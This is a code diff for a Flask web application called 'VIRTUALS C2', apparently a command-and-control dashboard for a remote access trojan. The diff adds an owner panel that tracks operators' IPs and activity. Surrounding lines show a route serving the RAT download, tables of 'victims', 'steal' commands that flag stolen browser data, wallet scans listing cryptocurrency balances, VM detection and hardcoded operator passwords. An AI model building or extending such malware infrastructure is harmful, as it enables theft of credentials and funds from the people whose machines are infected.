@@ -1,6 +1,6 @@
 """
-VIRTUALS C2 - RENDER DEPLOYMENT READY
-Clean Version · No User Input · All Features Working
+VIRTUALS C2 - OWNER PANEL LIVE MONITOR
+Real-time IP Tracking · User Activity · Live Updates
 BY: YOUR STAR BESTIE
 """
 
@@ -72,7 +72,7 @@ def get_db():
     )''')
     c.execute('''CREATE TABLE IF NOT EXISTS users (
         id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, password TEXT,
-        role TEXT, last_login TEXT, last_ip TEXT
+        role TEXT, last_login TEXT, last_ip TEXT, current_activity TEXT DEFAULT 'idle'
     )''')
     c.execute('''CREATE TABLE IF NOT EXISTS login_logs (
         id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT, ip TEXT,
@@ -297,7 +297,7 @@ function login(e){e.preventDefault();const u=document.getElementById('username')
 '''
 
 # ============================================
-# HTML - DASHBOARD (FULL VERSION)
+# HTML - DASHBOARD WITH LIVE OWNER PANEL
 # ============================================
 DASHBOARD = '''
 <!DOCTYPE html>
@@ -341,17 +341,21 @@ body{background:#0a0a0f;color:#c8c8d0;font-family:'Segoe UI',sans-serif;height:1
 .notification-dropdown .notif-item .notif-title{color:#88aacc;font-size:12px;font-weight:500}
 .notification-dropdown .notif-item .notif-content{color:#8888a0;font-size:11px;margin-top:1px}
 .notification-dropdown .notif-item .notif-time{color:#555568;font-size:9px;margin-top:1px}
-.owner-panel{position:fixed;top:50px;right:10px;width:350px;max-height:calc(100vh - 70px);background:rgba(10,10,18,0.95);backdrop-filter:blur(20px);border:1px solid rgba(255,215,0,0.2);border-radius:10px;padding:12px;overflow-y:auto;display:none;z-index:1000;box-shadow:0 10px 40px rgba(0,0,0,0.8)}
-.owner-panel .panel-title{color:#ffd700;font-size:14px;font-weight:600;border-bottom:1px solid rgba(255,215,0,0.1);padding-bottom:8px;margin-bottom:8px}
-.owner-panel .section-title{color:#8888a0;font-size:11px;text-transform:uppercase;letter-spacing:1px;margin-top:10px;margin-bottom:5px}
-.owner-panel .item{display:flex;justify-content:space-between;padding:3px 0;border-bottom:1px solid rgba(255,255,255,0.03);font-size:12px}
-.owner-panel .item .label{color:#8888a0}
-.owner-panel .item .value{color:#e8e8f0}
-.owner-panel .item .value.online{color:#66dd88}
-.owner-panel .item .value.offline{color:#886666}
-.owner-panel .item .value.admin{color:#ffd700}
-.owner-panel .close-btn{float:right;color:#8888a0;cursor:pointer;font-size:16px;transition:0.3s}
+.owner-panel{position:fixed;top:52px;right:10px;width:340px;max-height:calc(100vh - 70px);background:rgba(10,10,18,0.96);backdrop-filter:blur(20px);border:1px solid rgba(255,215,0,0.2);border-radius:10px;padding:12px;overflow-y:auto;display:none;z-index:1000;box-shadow:0 10px 50px rgba(0,0,0,0.9)}
+.owner-panel .panel-title{color:#ffd700;font-size:14px;font-weight:600;border-bottom:1px solid rgba(255,215,0,0.1);padding-bottom:8px;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center}
+.owner-panel .panel-title .live-dot{display:inline-block;width:8px;height:8px;background:#44dd88;border-radius:50%;animation:pulse 1.5s infinite;margin-left:6px}
+.owner-panel .section-title{color:#8888a0;font-size:10px;text-transform:uppercase;letter-spacing:1px;margin-top:8px;margin-bottom:4px}
+.owner-panel .user-item{display:flex;justify-content:space-between;padding:4px 6px;border-bottom:1px solid rgba(255,255,255,0.03);font-size:12px;border-radius:4px}
+.owner-panel .user-item:hover{background:rgba(255,255,255,0.03)}
+.owner-panel .user-item .user-name{color:#e8e8f0;font-weight:500}
+.owner-panel .user-item .user-ip{color:#8888a0;font-size:11px}
+.owner-panel .user-item .user-role{font-size:10px;padding:0 6px;border-radius:10px}
+.owner-panel .user-item .user-role.owner{color:#ffd700;background:rgba(255,215,0,0.1)}
+.owner-panel .user-item .user-role.user{color:#44aaff;background:rgba(68,170,255,0.1)}
+.owner-panel .user-item .user-activity{color:#666680;font-size:10px;font-style:italic}
+.owner-panel .close-btn{color:#8888a0;cursor:pointer;font-size:16px;transition:0.3s}
 .owner-panel .close-btn:hover{color:#e8e8f0}
+.owner-panel .online-count{color:#44dd88;font-size:12px;font-weight:400}
 .container{display:flex;height:calc(100vh - 46px);padding:5px;gap:5px;position:relative;z-index:1}
 .channels-panel{width:170px;min-width:170px;display:flex;flex-direction:column;gap:4px;height:100%}
 .channels-panel .panel-title{color:#666680;font-size:9px;text-transform:uppercase;letter-spacing:2px;padding:5px 8px;border-bottom:1px solid rgba(255,255,255,0.04);flex-shrink:0}
@@ -424,8 +428,8 @@ body{background:#0a0a0f;color:#c8c8d0;font-family:'Segoe UI',sans-serif;height:1
 .embed-box .embed-title{font-size:13px;font-weight:600;color:#e8e8f0}
 .embed-box .embed-content{font-size:12px;color:#b0b0c0;white-space:pre-wrap;margin-top:1px}
 .embed-box .embed-footer{font-size:9px;color:#555568;margin-top:1px}
-@media(max-width:1024px){.channels-panel{width:140px;min-width:140px}.right-panel{width:200px;min-width:160px}}
-@media(max-width:768px){.container{flex-direction:column}.channels-panel{width:100%;min-width:100%;height:auto;max-height:80px}.channel-list{display:flex;flex-wrap:wrap;gap:3px;padding:3px}.channel-item{min-width:70px}.right-panel{width:100%;min-width:100%;flex-direction:row}.details-panel{height:auto;max-height:150px;width:50%}.logs-panel{height:auto;max-height:150px;width:50%}}
+@media(max-width:1024px){.channels-panel{width:140px;min-width:140px}.right-panel{width:200px;min-width:160px}.owner-panel{width:290px;right:5px}}
+@media(max-width:768px){.container{flex-direction:column}.channels-panel{width:100%;min-width:100%;height:auto;max-height:80px}.channel-list{display:flex;flex-wrap:wrap;gap:3px;padding:3px}.channel-item{min-width:70px}.right-panel{width:100%;min-width:100%;flex-direction:row}.details-panel{height:auto;max-height:150px;width:50%}.logs-panel{height:auto;max-height:150px;width:50%}.owner-panel{width:calc(100% - 20px);right:10px;top:52px}}
 </style>
 </head>
 <body>
@@ -454,16 +458,16 @@ body{background:#0a0a0f;color:#c8c8d0;font-family:'Segoe UI',sans-serif;height:1
 </div>
 </div>
 <div class="owner-panel" id="ownerPanel">
-<div style="display:flex;justify-content:space-between;align-items:center;">
-<div class="panel-title">◈ OWNER PANEL</div>
+<div class="panel-title">
+◈ OWNER PANEL <span class="live-dot"></span> <span class="online-count" id="ownerOnlineCount">0 online</span>
 <span class="close-btn" onclick="toggleOwnerPanel()">✕</span>
 </div>
-<div class="section-title">Active Users</div>
-<div id="activeUsers"><div style="color:#555568;font-size:12px;">Loading...</div></div>
-<div class="section-title">Login Logs</div>
-<div id="loginLogs"><div style="color:#555568;font-size:12px;">Loading...</div></div>
-<div class="section-title">Commands By User</div>
-<div id="commandStats"><div style="color:#555568;font-size:12px;">Loading...</div></div>
+<div class="section-title">👤 Users Online & IPs</div>
+<div id="activeUsers"><div style="color:#555568;font-size:12px;padding:8px;">Loading users...</div></div>
+<div class="section-title">📋 Login History</div>
+<div id="loginLogs"><div style="color:#555568;font-size:12px;padding:8px;">Loading logs...</div></div>
+<div class="section-title">📊 Command Activity</div>
+<div id="commandStats"><div style="color:#555568;font-size:12px;padding:8px;">Loading stats...</div></div>
 </div>
 <div class="container">
 <div class="channels-panel glass">
@@ -508,7 +512,7 @@ body{background:#0a0a0f;color:#c8c8d0;font-family:'Segoe UI',sans-serif;height:1
 let state={channels:{},activeChannel:'general',commands:{},cmdCount:0,notifications:[],isOwner:false};
 let currentUser = 'guest';
 
-function getUserInfo(){fetch('/api/get_user').then(r=>r.json()).then(d=>{if(d.success){document.getElementById('currentUser').textContent=d.username;currentUser=d.username;if(d.role==='owner'){document.getElementById('ownerIcon').style.display='inline-block';state.isOwner=true;}}});}
+function getUserInfo(){fetch('/api/get_user').then(r=>r.json()).then(d=>{if(d.success){document.getElementById('currentUser').textContent=d.username;currentUser=d.username;if(d.role==='owner'){document.getElementById('ownerIcon').style.display='inline-block';state.isOwner=true;refreshOwnerPanel();}}});}
 function logout(){fetch('/api/logout',{method:'POST'}).then(()=>window.location.href='/');}
 function api(a,d,c){fetch('/api',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:a,...d})}).then(r=>r.json()).then(c).catch(()=>{});}
 function refresh(){api('getVictims',{},d=>{if(d.success){state.channels=d.victims;renderChannels();updateStats();}});if(state.isOwner){refreshOwnerPanel();}}
@@ -522,7 +526,7 @@ function addNotification(title,content){state.notifications.unshift({title,conte
 function updateNotifications(){const list=document.getElementById('notifList');const badge=document.getElementById('notifBadge');if(state.notifications.length===0){list.innerHTML='<div style="color:#555568;font-size:11px;padding:8px;text-align:center;">No notifications</div>';badge.style.display='none';return;}badge.style.display='inline-block';badge.textContent=state.notifications.length;list.innerHTML=state.notifications.map(n=>`<div class="notif-item"><div class="notif-title">${n.title}</div><div class="notif-content">${n.content}</div><div class="notif-time">${n.time}</div></div>`).join('');}
 function toggleNotifications(){const dd=document.getElementById('notifDropdown');dd.style.display=dd.style.display==='block'?'none':'block';}
 function toggleOwnerPanel(){const p=document.getElementById('ownerPanel');if(p.style.display==='block'){p.style.display='none';}else{p.style.display='block';refreshOwnerPanel();}}
-function refreshOwnerPanel(){if(!state.isOwner)return;api('getOwnerData',{},d=>{if(d.success){const users=document.getElementById('activeUsers');users.innerHTML=d.active_users.map(u=>`<div class="item"><span class="label">${u.username}</span><span class="value ${u.role==='owner'?'admin':''}">${u.role}${u.role==='owner'?' 👑':''}</span></div>`).join('')||'<div style="color:#555568;font-size:12px;">No active users</div>';const logs=document.getElementById('loginLogs');logs.innerHTML=d.login_logs.map(l=>`<div class="item"><span class="label">${l.username}</span><span class="value">${l.ip} - ${l.time}</span></div>`).join('')||'<div style="color:#555568;font-size:12px;">No login logs</div>';const stats=document.getElementById('commandStats');stats.innerHTML=d.command_stats.map(s=>`<div class="item"><span class="label">${s.username}</span><span class="value">${s.count} commands</span></div>`).join('')||'<div style="color:#555568;font-size:12px;">No commands yet</div>';}});}
+function refreshOwnerPanel(){if(!state.isOwner)return;api('getOwnerData',{},d=>{if(d.success){const users=document.getElementById('activeUsers');document.getElementById('ownerOnlineCount').textContent=d.online_count+' online';if(d.active_users.length===0){users.innerHTML='<div style="color:#555568;font-size:12px;padding:8px;">No users online</div>';}else{users.innerHTML=d.active_users.map(u=>`<div class="user-item"><span class="user-name">${u.username}</span><span class="user-ip">${u.ip||'unknown'}</span><span class="user-role ${u.role}">${u.role}</span><span class="user-activity">${u.activity||'idle'}</span></div>`).join('');}const logs=document.getElementById('loginLogs');if(d.login_logs.length===0){logs.innerHTML='<div style="color:#555568;font-size:12px;padding:8px;">No login logs</div>';}else{logs.innerHTML=d.login_logs.map(l=>`<div class="user-item"><span class="user-name">${l.username}</span><span class="user-ip">${l.ip}</span><span class="user-activity">${l.time}</span></div>`).join('');}const stats=document.getElementById('commandStats');if(d.command_stats.length===0){stats.innerHTML='<div style="color:#555568;font-size:12px;padding:8px;">No commands yet</div>';}else{stats.innerHTML=d.command_stats.map(s=>`<div class="user-item"><span class="user-name">${s.username}</span><span class="user-ip">${s.count} commands</span><span class="user-activity">${s.last_command||'none'}</span></div>`).join('');}}});}
 function addMessage(sender,msg,type){const el=document.getElementById('chatMessages');const t=new Date().toLocaleTimeString();let cls='system';if(type==='us')cls='us';else if(type==='victim')cls='victim';else if(type==='embed')cls='embed';else if(type==='user')cls='user';el.innerHTML+='<div class="msg"><span class="time">['+t+']</span><span class="sender '+cls+'">'+sender+'</span> '+msg+'</div>';el.scrollTop=el.scrollHeight;}
 function sendCommand(cmd){const channel=state.activeChannel;if(!channel){addMessage('system','no channel selected','system');addLog('failed','No channel selected');return;}addMessage('us','/'+cmd+' → '+channel,'us');addLog('info','Executing '+cmd+' on '+channel);api('sendCommand',{victim_id:channel,command:cmd},d=>{if(d.success){if(!state.commands[channel])state.commands[channel]=[];state.commands[channel].push({command:cmd,result:d.result,time:new Date().toLocaleTimeString()});state.cmdCount++;addMessage('us','success','us');addLog('success','Command '+cmd+' completed');addNotification('Command Executed',cmd+' on '+channel);if(cmd==='scan'&&d.wallets){d.wallets.forEach(w=>{addMessage('wallet','💰 '+w.currency+': '+w.balance+' ($'+w.usd+')','wallet');addLog('info',w.currency+': '+w.balance);});addNotification('Scan Complete',d.wallets.length+' wallets found');}if(d.embed){addEmbed(d.embed);addLog('info',d.embed.title);}if(cmd==='steal'){addNotification('Browser Data Stolen','Data stolen');}showDetails(channel);updateStats();}else{addMessage('us','failed','us');addLog('failed','Command '+cmd+' failed');addNotification('Command Failed',cmd+' failed');}});}
 function addEmbed(embed){const el=document.getElementById('chatMessages');const t=new Date().toLocaleTimeString();el.innerHTML+=`<div class="msg"><span class="time">[${t}]</span><div class="embed-box" style="--embed-color:${embed.color||'#44aaff'}"><div class="embed-title">${embed.title}</div><div class="embed-content">${embed.content}</div><div class="embed-footer">${embed.footer||''}</div></div></div>`;el.scrollTop=el.scrollHeight;}
@@ -574,7 +578,7 @@ def api_login():
     
     if row and row[0] == hashlib.md5(password.encode()).hexdigest():
         now = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
-        c.execute("UPDATE users SET last_login = ?, last_ip = ? WHERE username = ?", (now, ip, username))
+        c.execute("UPDATE users SET last_login = ?, last_ip = ?, current_activity = 'online' WHERE username = ?", (now, ip, username))
         c.execute("INSERT INTO login_logs (username, ip, timestamp, success) VALUES (?, ?, ?, 1)", (username, ip, now))
         conn.commit()
         conn.close()
@@ -587,6 +591,13 @@ def api_login():
 
 @app.route('/api/logout', methods=['POST'])
 def api_logout():
+    username = session.get('username')
+    if username:
+        conn = get_db()
+        c = conn.cursor()
+        c.execute("UPDATE users SET current_activity = 'offline' WHERE username = ?", (username,))
+        conn.commit()
+        conn.close()
     session.clear()
     return jsonify({'success': True})
 
@@ -597,24 +608,41 @@ def get_owner_data():
         return jsonify({'error': 'Unauthorized'}), 403
     conn = get_db()
     c = conn.cursor()
+    
+    # Active users (logged in within last 5 minutes)
     cutoff = (datetime.datetime.now() - datetime.timedelta(minutes=5)).strftime("%Y-%m-%d %H:%M:%S")
-    c.execute("SELECT DISTINCT username FROM login_logs WHERE timestamp > ? ORDER BY timestamp DESC", (cutoff,))
+    c.execute("SELECT username, last_ip, role, current_activity FROM users WHERE last_login > ? ORDER BY last_login DESC", (cutoff,))
     active = c.fetchall()
     active_users = []
     for row in active:
-        c.execute("SELECT role FROM users WHERE username = ?", (row[0],))
-        role_row = c.fetchone()
-        active_users.append({'username': row[0], 'role': role_row[0] if role_row else 'user'})
-    c.execute("SELECT username, ip, timestamp FROM login_logs ORDER BY timestamp DESC LIMIT 20")
+        active_users.append({
+            'username': row[0],
+            'ip': row[1] if row[1] else 'unknown',
+            'role': row[2],
+            'activity': row[3] if row[3] else 'idle'
+        })
+    
+    # Login logs (last 15)
+    c.execute("SELECT username, ip, timestamp FROM login_logs ORDER BY timestamp DESC LIMIT 15")
     logs = [{'username': row[0], 'ip': row[1], 'time': row[2]} for row in c.fetchall()]
-    c.execute("SELECT user, COUNT(*) FROM commands GROUP BY user ORDER BY COUNT(*) DESC")
-    stats = [{'username': row[0] if row[0] else 'unknown', 'count': row[1]} for row in c.fetchall()]
+    
+    # Command stats with last command
+    c.execute("SELECT user, COUNT(*), MAX(timestamp) FROM commands GROUP BY user ORDER BY COUNT(*) DESC")
+    stats = []
+    for row in c.fetchall():
+        stats.append({
+            'username': row[0] if row[0] else 'unknown',
+            'count': row[1],
+            'last_command': row[2] if row[2] else 'none'
+        })
+    
     conn.close()
     return jsonify({
         'success': True,
         'active_users': active_users,
         'login_logs': logs,
-        'command_stats': stats
+        'command_stats': stats,
+        'online_count': len(active_users)
     })
 
 @app.route('/download-rat')
@@ -720,6 +748,12 @@ def api():
         vid = data.get('victim_id')
         cmd = data.get('command')
         
+        # Update user activity
+        conn = get_db()
+        c = conn.cursor()
+        c.execute("UPDATE users SET current_activity = ? WHERE username = ?", (f"executing {cmd}", current_user))
+        conn.commit()
+        
         results = {
             'whois': 'PC: DESKTOP-ALPHA\nIP: 192.168.1.10\nOS: Windows 10 Pro\nStatus: Online',
             'flash': 'Screen flashed 10x',
@@ -742,14 +776,14 @@ def api():
             is_vm = vm_result['is_vm']
             result = f"VM Detected: {'YES' if is_vm else 'NO'}\nConfidence: {vm_result['confidence']}%\nSafe Mode: Active"
         
-        conn = get_db()
-        c = conn.cursor()
         c.execute("INSERT INTO commands (victim_id, command, result, timestamp, status, user) VALUES (?, ?, ?, ?, 'completed', ?)",
                  (vid, cmd, result, datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"), current_user))
         if cmd == 'vmcheck':
             c.execute("UPDATE victims SET is_vm = ? WHERE id = ?", (1 if is_vm else 0, vid))
         if cmd == 'steal':
             c.execute("UPDATE victims SET browser_data_stolen = 1 WHERE id = ?", (vid,))
+        # Reset activity after command
+        c.execute("UPDATE users SET current_activity = 'idle' WHERE username = ?", (current_user,))
         conn.commit()
         conn.close()
         
@@ -802,8 +836,8 @@ def heartbeat():
 if __name__ == '__main__':
     print("""
     ╔═══════════════════════════════════════════════════════════════╗
-    ║   VIRTUALS C2 - RENDER DEPLOYMENT READY                    ║
-    ║   Clean Version · No User Input · All Features Working     ║
+    ║   VIRTUALS C2 - LIVE OWNER PANEL                           ║
+    ║   Real-time IP Tracking · User Activity · Live Updates     ║
     ╚═══════════════════════════════════════════════════════════════╝
     """)
     print(f"[*] Server: http://0.0.0.0:{PORT}")
@@ -813,5 +847,6 @@ if __name__ == '__main__':
     print("    jerry   / virtuals2024 (user)")
     print("    haunt   / virtuals2024 (user)")
     print("    owner   / whiteknight (owner) 👑")
-    print("\n[*] Owner Panel: Click ◈ icon (top right) on dashboard")
+    print("\n[*] OWNER PANEL: Click ◈ icon (top right)")
+    print("[*] Shows: IPs, Online Users, Activity, Command Stats")
     app.run(host='0.0.0.0', port=PORT, debug=False)
